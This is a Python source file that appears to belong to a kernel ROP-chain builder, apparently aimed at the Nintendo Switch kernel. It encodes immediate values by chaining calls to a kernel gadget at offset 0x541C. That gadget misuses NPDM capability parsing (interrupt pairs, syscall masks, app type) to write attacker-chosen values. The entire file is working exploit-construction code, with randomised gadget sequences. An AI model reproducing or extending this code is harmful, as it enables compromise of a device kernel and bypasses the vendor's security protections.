import Gadgets
import Sequences
import random

def get_imm_encoder(imm):
    possible_encoders = [
        EncodedImm_NpdmInterruptPair,
        EncodedImm_NpdmSyscallMask,        
    ]

    if imm < 8:
        possible_encoders += [
            EncodedImm_NpdmAppType
        ]

    return random.choice(possible_encoders)(imm)

class EncodedImm_NpdmAppType:
    def __init__(self, imm):
        self.imm = imm
        self.placeholder = Gadgets.ImmPlaceholder()
        assert imm < 8

    def generate(self, r):
        scratch_zero = r.add_data([Gadgets.Imm(0)])

        return [
            Sequences.LoadX8(Gadgets.KernelGadget(0x541C)),
            Sequences.Load_X0X1X2X3(
                Gadgets.PlaceholderReference(self.placeholder, -172), scratch_zero, Gadgets.Imm(0), Gadgets.Imm(0x1FFF | (self.imm<<14))),
            Sequences.CallX8()
        ]

    def get_imm_placeholder(self):
        return self.placeholder

class EncodedImm_NpdmInterruptPair:
    def __init__(self, imm):
        self.imm = imm
        self.placeholder = Gadgets.ImmPlaceholder()

    def generate(self, r):
        scratch_zero = r.add_data([Gadgets.Imm(0)])

        indices = []

        for i in range(32):
            if self.imm & (1<<i):
                indices += [ i ]

        if len(indices) % 2:
            indices += [ 0x3ff ]

        random.shuffle(indices)

        ret = []
        for i in range(0, len(indices), 2):
            ret += [
                Sequences.LoadX8(Gadgets.KernelGadget(0x541C)),
                Sequences.Load_X0X1X2X3(
                    Gadgets.PlaceholderReference(self.placeholder, -16),
                    scratch_zero, Gadgets.Imm(0),
                    Gadgets.Imm(0x7FF | (indices[i]<<12) | (indices[i+1]<<22))
                ),
                Sequences.CallX8()
            ]
        return ret

    def get_imm_placeholder(self):
        return self.placeholder

class EncodedImm_NpdmSyscallMask:
    def __init__(self, imm):
        self.imm = imm
        self.placeholder = Gadgets.ImmPlaceholder()

    def generate(self, r):
        scratch_zero  = r.add_data([Gadgets.Imm(0)])
        scratch_zero2 = r.add_data([Gadgets.Imm(0)])

        masks = []

        low = self.imm & 0xFFFFFF
        if low > 0:
            masks += [
                low
            ]

        high = self.imm >> 24
        if high > 0:
            masks += [
                high
            ]

        masks_idxs = list(range(len(masks)))
        random.shuffle(masks_idxs)

        ret = []
        for i, m in enumerate(masks_idxs):
            ret += [
                Sequences.LoadX8(Gadgets.KernelGadget(0x541C)),
                Sequences.Load_X0X1X2X3(
                    Gadgets.PlaceholderReference(self.placeholder, 0),
                    scratch_zero, scratch_zero2,
                    Gadgets.Imm(0xF | (masks[m] << 5) | (m << 29))
                ),
                Sequences.CallX8()
            ]
        return ret

    def get_imm_placeholder(self):
        return self.placeholder
